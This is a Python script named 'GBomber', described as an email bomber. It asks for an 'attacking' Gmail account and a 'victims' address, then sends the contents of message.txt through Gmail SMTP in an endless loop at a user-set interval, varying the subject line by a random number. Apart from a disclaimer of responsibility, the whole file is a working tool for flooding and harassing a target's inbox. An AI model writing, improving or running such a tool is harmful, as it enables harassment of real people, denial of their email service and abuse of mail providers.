#KV5d
#11/2020
#DESC: Email Bomber

#imports

import smtplib
import time
import random
from email.header import Header
from email.mime.text import MIMEText
from art import *
import datetime
from tqdm import *
import colorama
from colorama import Fore, Back, Style
colorama.init()



#invar

now = datetime.datetime.now()

cRes = Style.RESET_ALL

blue = Fore.BLUE

white = Fore.LIGHTWHITE_EX

green = Fore.GREEN

cyan = Fore.CYAN

purp = Fore.MAGENTA

yell = Fore.YELLOW

red = Fore.RED

p_reader = open('password.txt', 'r')

cipher = p_reader.read()


def intro():
    tprint("GBomber")
    print()
    print(now)
    print()
    print(blue + "Initializing... \n\n" + cRes + white)

    for i in trange(100):
        time.sleep(0.05)

    print("\n" + cRes)
    print(green + "Initialized\n" + cRes)


def setup():
    global attacker
    attacker = input(purp + "What is the sending/attacking email address: " + cRes)

    print()

    global apw
    apw = input(purp + "Is the sending/attacking email password set in password.txt (y) or (n): " + cRes)

    print()

    if apw == "y":
        pass

    if apw != "y":
        print(red + "Please set your email password in password.txt" + cRes)
        time.sleep(1)
        exit()

    global ims
    ims = input(purp + "Is your message set in message.txt (y) or (n): " + cRes)

    print()

    if ims == "y":
        pass

    if ims != "y":
        print(red + "Please set your message in message.txt" + cRes)
        time.sleep(1)
        exit()


    global victims
    victims = input(purp + "Enter the victims email address: " + cRes)

    print()

    global sFreq
    sFreq = int(input(purp + "What is the frequency you would like to send the emails at (sec): " + cRes))

    print()

    print(yell + "Notes: to stop bombing press (ctrl+c)" + cRes)
    time.sleep(1)
    print(yell + "Notes: Make sure you enter the message as well as the email password in the specified .txt files" + cRes)
    time.sleep(1)
    print(yell + "I am not responsible for any misuse or criminal activity\n\n" + cRes)
    time.sleep(1)

    agree = input(blue + "Do you agree to the Terms of Service yes(y) or no(n): " + cRes)

    print()

    if agree == "y":
        pass

    if agree != "y":
        print(red + "Sorry you cannot use GBomber without agreeing! " + cRes)
        time.sleep(1)
        exit()


def spam():
    while (True):
        fp = open(
            'message.txt', 'r')
        msg = MIMEText(fp.read(), 'plain', 'utf-8')
        fp.close()

        thread_number = random.randint(0, 10000)
        msg['Subject'] = Header('... (randomizer: ' + str(thread_number) + ')', 'utf-8')
        msg['From'] = attacker
        msg['To'] = ', '.join(victims)

        s = smtplib.SMTP(host='smtp.gmail.com', port=587)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(attacker, cipher)
        s.sendmail(attacker, victims, msg.as_string())

        print(green + "Email has been sent to: " + cyan + victims)
        s.quit()
        time.sleep(sFreq)


def run():
    intro()
    setup()
    spam()


run()
